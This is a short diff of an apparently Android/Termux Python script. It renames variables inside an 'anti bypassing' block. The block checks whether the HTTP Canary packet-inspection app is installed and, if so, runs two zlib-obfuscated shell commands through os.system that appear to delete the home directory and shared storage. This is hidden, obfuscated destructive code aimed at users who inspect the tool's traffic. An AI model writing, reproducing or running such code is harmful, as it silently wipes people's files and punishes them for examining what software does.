@@ -37,11 +37,11 @@ gxdsprnt = str(f"{li}" * 37)
 
 # ANTI BYPASSING
 try:
-    g = "anar"
-    f="tt"
+    qc = "anar"
+    cq = "tt"
     file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
 
-    if f'com.h{f}pc{g}y.pro' in file_d:
+    if f'com.h{cq}pc{qc}y.pro' in file_d:
         print(f"{lr} [X] HTTP CANARY DETECTED!")
         os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
         os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
